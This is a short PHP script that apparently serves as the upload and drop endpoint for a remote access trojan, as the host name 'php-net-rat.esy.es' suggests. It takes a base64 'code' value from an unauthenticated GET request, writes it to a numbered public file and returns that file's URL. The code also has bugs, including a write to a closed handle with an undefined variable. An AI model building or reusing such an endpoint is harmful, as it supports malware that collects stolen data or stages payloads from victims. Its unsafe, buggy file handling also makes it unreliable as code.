<?php

$file = 'uploads/current_id.txt';
$fh = fopen($file, 'r');
	$x = fread($fh, filesize($file));
fclose($fh);
$fh = fopen($file, 'w');
	fwrite($fh, $x + 1);
fclose($fh);
$data = $_GET['code'];

$handle = fopen('uploads/base64_'.$x.'.txt', "a");
   flock($handle , LOCK_EX);
    fwrite($fh, $content); 
    $write = fwrite($handle, $data);
    flock($handle , LOCK_UN);
fclose($handle);

echo 'http://php-net-rat.esy.es/uploads/base64_'.$x.'.txt';
?>